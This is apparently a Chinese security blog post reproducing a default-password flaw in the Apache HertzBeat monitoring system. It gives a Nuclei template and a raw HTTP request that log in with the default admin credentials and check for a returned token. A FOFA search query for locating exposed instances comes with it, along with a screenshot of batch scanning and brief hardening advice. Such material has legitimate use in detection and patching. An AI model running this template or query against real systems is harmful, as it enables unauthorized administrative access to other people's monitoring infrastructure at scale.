#  Apache-HertzBeat开源实时监控系统存在默认口令漏洞【漏洞复现|附nuclei-POC】   
原创 kingkong  脚本小子   2024-12-06 06:40  
  
****  
**免责声明：**  
**本文内容仅供技术学习参考，请勿用于违法破坏。利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，与作者无关。如有侵权请联系删除。**  
  
****  
****  
**漏洞描述：**  
  
Apache-HertzBeat开源实时监控系统存在默认口令漏洞。  
攻击者  
可能利用弱口令导致系统、应用程序或账户遭受未经授权的访问、信息泄露或其他安全风险。  
  
  
01  
  
—  
  
**Nuclei POC**  
  
```
id: Apache-HertzBeat-default-passwd

info:
  name: Apache-HertzBeat开源实时监控系统存在默认口令漏洞
  author: kingkong
  severity: high
  metadata:
    fofa-query: app="HertzBeat-实时监控系统""

http:
  - raw:
      - |
        POST /api/account/auth/form HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json
        Content-Length: 56

        {"type":0,"identifier":"admin","credential":"hertzbeat"}

    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
              - 'status_code_1 == 200'
              - 'contains(body_1,"token")'
        condition: and
```  
  
  
02  
  
—  
  
搜索语法  
```
FOFA：app="HertzBeat-实时监控系统"
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/aEP4jW2ohneCqaAO1guictZavSImBZfTibuOcsiazl2vMjPhJPfYUdvkCXQRhvN2AR96CHJkebkykicEoV0kQicbeAQ/640?wx_fmt=png&from=appmsg "")  
  
  
界面如下  
  
![](https://mmbiz.qpic.cn/mmbiz_png/aEP4jW2ohneCqaAO1guictZavSImBZfTibNKkSriaUFUoAMJPRUEciae2BMjwqQF26iaFp8O0usClekXyva7AiczzcCg/640?wx_fmt=png&from=appmsg "")  
  
  
  
03  
  
—  
  
漏洞复现  
  
![](https://mmbiz.qpic.cn/mmbiz_png/aEP4jW2ohneCqaAO1guictZavSImBZfTibzXOSNUwjetnPicnUkVI9W6wSicnMcvlCVXzGibEJ2554sxVMJj7DtIt9Q/640?wx_fmt=png&from=appmsg "")  
  
  
漏洞检测POC  
```
POST /api/account/auth/form HTTP/2
Host: 
Content-Type: application/json
Content-Length: 56

{"type":0,"identifier":"admin","credential":"hertzbeat"}
```  
  
  
neclei批量检测截图  
  
![](https://mmbiz.qpic.cn/mmbiz_png/aEP4jW2ohneCqaAO1guictZavSImBZfTibV9bnrn3hGxLic7IEL7c9ffESjy1hJmKuSxEkIIpZrO1KcxicEO76QnNQ/640?wx_fmt=png&from=appmsg "")  
  
  
  
  
04  
  
—  
  
修复建议  
  
  
1、强制密码策略：实施强制的密码复杂性要求，包括长度、大小写字母、数字和特殊字符的组合等。  
  
2、多因素身份验证：使用多因素身份验证（MFA）来增强账户的安全性，即使密码泄露也能提供额外的保护。  
  
3、密码定期更新：建议用户定期更改密码，以减少密码泄露后的风险。  
  
  
  
  
  
05  
  
—  
  
下载地址  
  
  
进入公众号点击POC可获取所有POC文件  
  
![](https://mmbiz.qpic.cn/mmbiz_png/aEP4jW2ohneS7aOPfDNKhvOicibVlyrkJ3A4EuUx5c5S8eAxFnF9KiaibAGJfP6ibB6ze4Rm4pZ7MI4jQibT05lTevqg/640?wx_fmt=other&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
  
  
  
  
  
